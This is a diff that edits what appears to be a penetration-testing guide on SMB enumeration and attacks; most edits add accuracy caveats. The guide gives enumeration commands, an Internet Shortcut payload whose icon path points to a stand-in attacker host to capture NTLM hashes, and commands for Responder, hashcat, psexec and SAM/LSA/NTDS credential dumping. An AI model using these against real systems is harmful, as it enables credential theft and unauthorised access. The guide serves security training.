@@ -12,9 +12,9 @@ weight: 2
 - Listening port: **139 TCP (NetBIOS)**, **445 TCP**
 - OS: Windows, Unix-Like (Samba)
 
-**Server Message Block (SMB)** is a client-server protocol that regulates access to file shares and network resources like printers and routers. It was originally built on **Network Basic Input/Output System (NetBIOS)**, a network API created by IBM that provided computer naming, session, and datagram service. Since Windows 2000, SMB runs directly over TCP and listens on port 445, but **NetBIOS over TCP** (port 137-139) is kept for backward Compatibility with SMB over NetBIOS.
+**Server Message Block (SMB)** is a client-server protocol that regulates access to file shares and network resources like printers and named pipes. It was originally built on **Network Basic Input/Output System (NetBIOS)**, a network API created by IBM that provided computer naming, session, and datagram services. Since Windows 2000, SMB can run directly over TCP on port 445. Legacy SMB over NetBIOS uses TCP port 139 for sessions; NetBIOS name and datagram services use ports 137 (TCP/UDP) and 138 (UDP), respectively.
 
-Samba is an open-source implementation of SMB that runs on Linux systems and is compatible with Windows SMB. Samba also comes with utilities like `smbclient` and `rpcclient` that are very useful for interacting with both SMB servers.
+Samba is an open-source implementation of SMB that runs on Linux systems and is compatible with Windows SMB. Samba also comes with utilities like `smbclient` and `rpcclient` that are very useful for interacting with Windows and Samba SMB servers.
 
 ## Nmap
 Nmap Enumeration Scan with `smb-protocols` and `smb2-security-mode` scripts:
@@ -42,11 +42,11 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
 ```
-- The `smb-protocols` script identifies SMB dialects available. If SMBv1 is available, the host may be vulnerable to [EternalBlue](https://learn.microsoft.com/en-us/security-updates/Securitybulletins/2017/ms17-010).
-- The `smb2-security-mode` script identifies whether SMB signing is required. The signing is not required, the host may be used for [SMB Relay Attack](http://leikah.haoyingcao.xyz/en/docs/active_directory/initial_access/smb_relay/)
+- The `smb-protocols` script identifies available SMB dialects. SMBv1 support alone does not establish [EternalBlue](https://learn.microsoft.com/en-us/security-updates/Securitybulletins/2017/ms17-010) vulnerability; the Windows version and patch level also matter.
+- The `smb2-security-mode` script identifies whether SMB signing is required. If signing is not required, the host may be a target for an [SMB relay attack](http://leikah.haoyingcao.xyz/en/docs/active_directory/initial_access/smb_relay/), subject to authentication policy and the relayed account's permissions.
 
 ## SMB File Share Enumeration
-If we have access to a user's credential, or the guest account is enabled, we can use `smbclient` to list out the shares available:
+If we have access to a user's credentials, or the guest account is enabled, we can use `smbclient` to list out the shares available:
 ```shell-session
 $ smbclient -L //10.10.0.5 -U 'amuro.ray' --password='Password1'
 
@@ -85,7 +85,7 @@ smb: \>
 - `cd` to change directory
 - `get` to download file
 - `put` to upload file
-- `!<cmd>` to execute a command on local machine
+- `!<cmd>` to execute a command on the local machine
 
 The `help` command shows a comprehensive list of commands.
 ```shell-session
@@ -110,9 +110,9 @@ tcon           tdis           tid            utimes         logoff
 ..             !
 ```
 #### Test Write Access
-If we connected to an SMB share as guest or via a null session, there is a possibility we can write to the share. Depending its purpose, this may have security implications that are noteworthy. It could enable malicious phishing files from being placed in an office file share, for example.
+If we connected to an SMB share as guest or via a null session, there is a possibility we can write to the share. Depending on its purpose, this may have noteworthy security implications. For example, it could allow malicious phishing files to be placed in an office file share.
 
-To rest guest/null write access, we create a test file and use the `put` command upload it.
+To test guest/null write access, we create a test file and use the `put` command to upload it.
 ```shell-session
 smb: \> !touch test.txt
 smb: \> put test.txt
@@ -147,7 +147,7 @@ We may also utilize tools to explore SMB shares in an automated manner. The `spi
 nxc smb <host> -u <user> -p <password> -M spider_plus
 ```
 
-NetExec explores every readable share by the current user, and saves a JSON-formatted list of readable files to disk.
+NetExec explores shares readable by the current user, subject to its filters, and saves a JSON-formatted list of readable files to disk.
 ```shell-session
 ╭─brian@rx-93-nu ~
 ╰─$ nxc smb 10.10.0.3 -u amuro.ray -p 'Password1' -M spider_plus
@@ -183,7 +183,7 @@ SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] File size min:        22
 SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] File size max:        6.2 KB
 ```
 
-From the Windows Perspective, we may make use of [Snaffler](https://github.com/SnaffCon/Snaffler), a tool designed to find user credentials stored in cleartext within file shares.
+From the Windows perspective, we may make use of [Snaffler](https://github.com/SnaffCon/Snaffler), a tool designed to find user credentials stored in cleartext within file shares.
 ```
 Snaffler.exe -s -d <domain_fqdn> -o snaffler.log -v data
 ```
@@ -204,10 +204,10 @@ nxc smb 10.10.0.5 -u '' -p ''
 ```
 
 ## SMB User Enumeration
-We can enumerate a list of users on an Windows machine or Active Directory Domain.
+We can enumerate users on a Windows machine or in an Active Directory domain.
 
 ### RID Brute Force
-If we can obtain a set of valid credentials, we can use it to conduct an **RID Brute Force** attack, which enumerates a comprehensive list of users and groups on an AD network by first obtaining the Domain **Security Identifier (SID)**, and appending different **Relative Identifiers (RID)** to it to find valid users and groups.
+If we can obtain a set of valid credentials, we can use it to conduct an **RID Brute Force** attack, which finds users and groups by obtaining an account-domain **Security Identifier (SID)** and appending different **Relative Identifiers (RIDs)** to it. The results depend on the target and the RID range queried; the examples below enumerate the target machine's local accounts, not every account in the AD domain.
 
 We can use the `--rid-brute` option in `netexec`:
 ```shell-session
@@ -282,7 +282,7 @@ name:[MSN-04-SAZABI] idx:[0x0]
 name:[Builtin] idx:[0x0]
 ```
 
-`querydominfo` enumerates information of the local domain.
+`querydominfo` queries information about the selected account domain, which is the machine's local account domain in this example.
 ```shell-session
 rpcclient $> querydominfo
 Domain:         MSN-04-SAZABI
@@ -357,7 +357,7 @@ DACL
 ```
 
 ### User Enumeration
-`enumdomusers` enumerates **local users**.
+`enumdomusers` enumerates users in the selected account domain: local users on a member machine, or AD domain users when querying a domain controller.
 ```shell-session
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
@@ -415,10 +415,10 @@ S-1-5-21-2157690859-2819111861-1098670742-1000 MSN-04-SAZABI\Char.Aznable (4)
 ## SMB Attacks
 This section deals with attacks that we can carry out using SMB. Note that some techniques here require at least local admin privileges.
 
-### Shortcut Icon NTLM Coercion (CVE‑2025‑50154)
-Windows Explorer renders shortcut icons automatically. If the icon path specified in a shortcut is a link to a SMB share, Windows Explorer will automatically attempt to connect to the share to grab the icon.
+### Shortcut Icon NTLM Coercion
+On affected Windows versions and configurations, processing a shortcut that references a remote SMB location may cause Windows Explorer to connect and attempt authentication. Behavior depends on patches and outbound SMB/NTLM policy; it is not guaranteed for every user or system.
 
-An attacker can craft a malicious internet shortcut file (`.url` or `.lnk` extension) to steal NTLM credential of any user visiting the folder containing the shortcut. Below is a minimalist payload sample:
+The text below is an Internet Shortcut (`.url`) example, not a binary Shell Link (`.lnk`). Do not rename this text to `.lnk`. It illustrates a remote icon reference, not a verified reproduction of CVE-2025-50154, whose published research concerns Shell Link processing:
 ```txt
 [InternetShortcut]
 URL=placeholder
@@ -426,11 +426,11 @@ WorkingDirectory=placeholder
 IconFile=\\<ATTACKER_IP>\share\icon.ico
 IconIndex=1
 ```
-If an SMB share is visited regularly by users on a network and we have write access to it, we can place the shortcut file to the share and launch Responder to coerce NTLM authentication for the incoming SMB connections.
+If an SMB share is visited regularly by users on a network and we have write access to it, we can place the shortcut file on the share and launch Responder to capture any resulting NTLM authentication.
 ```bash
 sudo responder -I <INTERFACE> -v
 ```
-Eventually, when a user visits the share and their Windows Explorer attempts to render the icon, we will be able to coerce NTLM authentication and capture their NetNTLMv2 hash in our Responder.
+If Windows Explorer processes the remote icon reference and outbound SMB/NTLM authentication is permitted, Responder may capture the user's NetNTLMv2 challenge-response material.
 ```shell-session
 [+] Listening for events...
 
@@ -439,13 +439,13 @@ Eventually, when a user visits the share and their Windows Explorer attempts to 
 [SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:<REDACTED>
 [...]
 ```
-After capturing the hash, we can either attempt to crack the hash or relay it to other SMB servers.
+Captured NetNTLMv2 challenge-response material can be used for offline password cracking; it is not the account's reusable NT hash. NTLM relay instead forwards a live authentication exchange to another service, subject to protections such as required SMB signing. A saved capture cannot simply be replayed to an arbitrary server.
 ```bash
 hashcat -m 5600 -O <NTLMv2-FILE> <WORDLIST>
 ```
-{{% alert title="Note" %}}Of course, this attack also works for local file paths as long as more than one user visits the path regularly.{{% /alert %}}
+{{% alert title="Note" %}}The same technique may apply to shortcuts in local directories visited by other users, subject to the same Windows version, patch, and authentication-policy constraints.{{% /alert %}}
 ### PsExec Remote Code Execution
-PsExec was originally a utility part of the Windows SysInternal suite that allows Administrators to execute command remotely by deploying a Windows Service image on the target's SMB share (`admin$` by default) and starts the PsExec service, which creates a named pipe that can send command to the system. Note that Administrator-level privilege on the target is needed to use PsExec.
+PsExec is a utility in the Windows Sysinternals suite that allows administrators to execute commands remotely. It deploys a service executable through the target's SMB share (`ADMIN$` by default), starts the service, and communicates through named pipes. Administrator-level privileges on the target are required for this method.
 
 Attackers can also abuse this mechanism to get code execution. PsExec is implemented in the Impacket Library, Netexec, and Metasploit. Below is an example of using Impacket `psexec.py`:
 ```bash
@@ -470,7 +470,7 @@ LSA dumping:
 nxc smb <HOST> -u <USER> -p <PASSWORD> --lsa
 ```
 
-NTDS.dit (on DC with Domain Adimin access):
+NTDS.dit (on a DC with Domain Admin access):
 ```bash
 nxc smb <HOST> -u <USER> -p <PASSWORD> --ntds
 ```
